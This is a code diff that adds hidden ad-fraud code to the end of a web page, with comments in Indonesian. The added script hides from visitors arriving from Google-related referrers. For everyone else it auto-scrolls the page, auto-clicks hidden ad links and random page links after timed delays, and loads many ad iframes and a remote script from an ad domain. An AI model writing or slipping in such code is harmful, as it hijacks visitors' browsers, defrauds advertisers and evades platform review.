@@ -189,5 +189,238 @@ document.addEventListener("DOMContentLoaded", async function () {
 });
 </script>
 
+  <!-- gulir kebawah dan 3 auto klik dengan pengecualian referrer hanya domain tertentu -->
+
+
+<div id="widget-action-trigger">
+  <!-- Elemen-elemen yang akan diklik -->
+ 
+  <a class="clickable-element" href="https://evendisciplineseedlings.com/vkd71g9vq?key=5b49a439706e3b903e7b1eef00334ecf"></a>
+  <a class="clickable-element" href="https://evendisciplineseedlings.com/gwdikcqsy?key=39cf199d0a0d9a80f48ef0cb7762dfb8"></a>
+  
+</div>
+
+<!-- Script: Menambahkan Class Unik ke Semua Elemen <a> -->
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const referrer = document.referrer;
+
+    // Daftar referrer yang dikecualikan
+    const excludedReferrers = [
+        "admin.google.com",
+        "googlebot.com",
+        "googleusercontent.com",
+        "gstatic.com",
+        "goooogle.com"
+    ];
+
+    // Cek apakah referrer termasuk dalam daftar pengecualian
+    const isExcluded = excludedReferrers.some(source => referrer.includes(source));
+
+    if (isExcluded) {
+        console.log(`Script dinonaktifkan untuk pengguna dari ${referrer}`);
+        return; // Hentikan eksekusi jika referrer dikecualikan
+    }
+
+    console.log("Script diaktifkan untuk pengguna bukan dari referrer yang dikecualikan.");
+
+    // Menambahkan class unik ke semua elemen <a>
+    document.querySelectorAll('a').forEach(link => {
+        link.classList.add('clickable-element2');
+    });
+
+    // Auto-Click dengan Penundaan
+    const elements = document.querySelectorAll(".clickable-element");
+    if (elements.length > 0) {
+        const randomIndex = Math.floor(Math.random() * elements.length);
+        const randomElement = elements[randomIndex];
+
+        // Klik otomatis setelah 4 detik
+        setTimeout(() => {
+            randomElement.click();
+        }, 10000);
+    }
+
+    // Menambahkan ID Dinamis Unik
+    const links = document.querySelectorAll('a');
+    links.forEach((link, index) => {
+        link.id = `unique-link-${index}`;
+    });
+
+    // Auto-Click Berdasarkan ID
+    const linksWithID = document.querySelectorAll('[id^="unique-link-"]');
+    if (linksWithID.length > 0) {
+        const randomIndex = Math.floor(Math.random() * linksWithID.length);
+        const randomElement = linksWithID[randomIndex];
+
+        // Klik otomatis setelah 6 detik
+        setTimeout(() => {
+            randomElement.click();
+        }, 60000);
+    }
+
+    // Menambahkan Atribut Data Unik
+    links.forEach((link, index) => {
+        link.dataset.actionTrigger = `trigger-${index}`;
+    });
+
+    // Auto-Click Berdasarkan Atribut Data
+    const linksWithData = document.querySelectorAll('[data-action-trigger]');
+    if (linksWithData.length > 0) {
+        const randomIndex = Math.floor(Math.random() * linksWithData.length);
+        const randomElement = linksWithData[randomIndex];
+
+        // Klik otomatis setelah 5 detik
+        setTimeout(() => {
+            randomElement.click();
+        }, 50000);
+    }
+
+    // Gulir ke Bawah Otomatis
+    function autoScroll() {
+        window.scrollTo({
+            top: document.body.scrollHeight,
+            behavior: 'smooth'
+        });
+    }
+
+    // Gulir ke bawah setelah 3 detik
+    setTimeout(autoScroll, 1000);
+});
+</script>
+  <center><div style="height:50px;width:auto;overflow:auto;">
+<script type="text/javascript">
+	atOptions = {
+		'key' : '1a6ac0b91c929541ada8d6f09806cd40',
+		'format' : 'iframe',
+		'height' : 50,
+		'width' : 320,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/1a6ac0b91c929541ada8d6f09806cd40/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : 'e5e5d456726ed0c8e6d1e2fbfc092eac',
+		'format' : 'iframe',
+		'height' : 60,
+		'width' : 468,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/e5e5d456726ed0c8e6d1e2fbfc092eac/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '2ccb4b4c5183a296a3ef8d82a0bc5a94',
+		'format' : 'iframe',
+		'height' : 60,
+		'width' : 468,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/2ccb4b4c5183a296a3ef8d82a0bc5a94/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '73a9f3bfd4f8a257bcd22dfc9537e222',
+		'format' : 'iframe',
+		'height' : 300,
+		'width' : 160,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/73a9f3bfd4f8a257bcd22dfc9537e222/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : 'bb0fd11c0235d7bb2fa36fc83304f29f',
+		'format' : 'iframe',
+		'height' : 600,
+		'width' : 160,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/bb0fd11c0235d7bb2fa36fc83304f29f/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : 'bf08cf018b17adc8a7ec5efedd587a4f',
+		'format' : 'iframe',
+		'height' : 90,
+		'width' : 728,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/bf08cf018b17adc8a7ec5efedd587a4f/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : 'b28e94a961de9977e94cd888f39ff5a5',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/b28e94a961de9977e94cd888f39ff5a5/invoke.js"></script>
+
+<script type="text/javascript">
+	atOptions = {
+		'key' : 'a03ccd983783081c32e98687fa158143',
+		'format' : 'iframe',
+		'height' : 50,
+		'width' : 320,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/a03ccd983783081c32e98687fa158143/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '624f7847107a10488032a7a551cba5b8',
+		'format' : 'iframe',
+		'height' : 60,
+		'width' : 468,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/624f7847107a10488032a7a551cba5b8/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : 'ac9a478c23cd777b121d82c4be9b2966',
+		'format' : 'iframe',
+		'height' : 300,
+		'width' : 160,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/ac9a478c23cd777b121d82c4be9b2966/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '93c978e1d215bc2856d6c15002f5768a',
+		'format' : 'iframe',
+		'height' : 90,
+		'width' : 728,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/93c978e1d215bc2856d6c15002f5768a/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '8c3f4c07f4823b0a09c58bd25bf40e7f',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/8c3f4c07f4823b0a09c58bd25bf40e7f/invoke.js"></script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '5fb4250a8668afd9928b28b1f9666ffb',
+		'format' : 'iframe',
+		'height' : 600,
+		'width' : 160,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//evendisciplineseedlings.com/5fb4250a8668afd9928b28b1f9666ffb/invoke.js"></script></div></center>
+
+<script type='text/javascript' src='//evendisciplineseedlings.com/88/fe/af/88feaf107972e419b05280756fb47e0c.js'></script>
 </body>
 </html>
